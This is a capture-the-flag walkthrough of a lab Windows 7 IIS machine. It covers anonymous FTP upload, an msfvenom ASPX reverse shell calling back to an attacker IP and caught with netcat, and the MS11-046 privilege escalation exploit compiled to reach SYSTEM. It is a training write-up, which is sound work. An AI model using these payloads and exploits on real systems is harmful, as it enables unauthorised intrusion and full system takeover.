# IP Address: 10.10.10.5

# Enumeration.1

```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.5 -t all

Running all scans on 10.10.10.5

Host is likely running Windows


PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### FTP
Anonymous login possible. Test file upload. Success.
```
┌──(code㉿kali)-[~]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:code): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt 
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

# Exploitation.1

Create reverse shell executable and upload to the target. 
```
┌──(code㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4488 -f aspx > reverse.aspx        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2737 bytes

┌──(code㉿kali)-[~]
└─$ ftp 10.10.10.5                                                                                  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:code): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> put reverse.aspx 
local: reverse.exe remote: reverse.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
73802 bytes sent in 0.00 secs (663.9913 MB/s)
```

Browse to http://10.10.10.5/reverse.aspx and catch reverse shell with netcat listener on port 4488.

```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488
listening on [any] 4488 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.5] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>

```

No access to what directory probably has user.txt.
```
C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users

18/03/2017  01:16 ��    <DIR>          .
18/03/2017  01:16 ��    <DIR>          ..
18/03/2017  01:16 ��    <DIR>          Administrator
17/03/2017  04:17 ��    <DIR>          babis
18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  09:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  22.282.698.752 bytes free

C:\Users>cd babis
cd babis
Access is denied.

```

# Enumeration.2
Copied over winpeas.exe but it's not running for some reason. We revert to manual enumeration. We are only the iis apppool\web user so we need a privilege escalation vector.

Windows 7 is notoriously riddled with vulnerabilities, so a quick Google search should turn up something. We try the first exploit for MS11-046.

# Exploitation.2

```
┌──(code㉿kali)-[~]
└─$ searchsploit -m windows_x86/local/40564.c

┌──(code㉿kali)-[~]
└─$ i686-w64-mingw32-gcc 40564.c -o afd.exe -lws2_32 
```

Copy the exploit to the target via FTP after setting the transfer mode to binary.

On the target: 
```
C:\inetpub\wwwroot>afd.exe
afd.exe

c:\Windows\System32>whoami 
whoami 
nt authority\system

```

# Proof
user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Devel/images/Pasted%20image%2020211113191455.png)

root.txt

![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Devel/images/Pasted%20image%2020211113191530.png)
